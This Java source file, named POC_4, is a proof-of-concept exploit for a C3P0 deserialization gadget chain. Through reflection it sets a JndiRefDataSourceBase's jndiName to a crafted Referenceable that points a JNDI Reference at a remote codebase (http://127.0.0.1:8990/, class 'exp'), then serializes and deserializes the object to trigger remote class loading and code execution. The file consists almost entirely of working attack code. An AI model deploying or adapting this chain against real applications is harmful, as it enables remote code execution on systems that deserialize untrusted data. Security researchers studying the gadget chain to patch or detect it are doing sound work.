package com.example.C3P0;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.mchange.v2.c3p0.impl.JndiRefDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class POC_4 {

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }

    public static void main(String[] args) throws Exception {
        JndiRefDataSourceBase poolBackedDataSourceBase = new JndiRefDataSourceBase(false);
        ReflectionUtil.setField(poolBackedDataSourceBase, "jndiName", new PoolSource("exp","http://127.0.0.1:8990/"));

        SerializeUtil.deserialize(SerializeUtil.serialize(poolBackedDataSourceBase));
    }

}
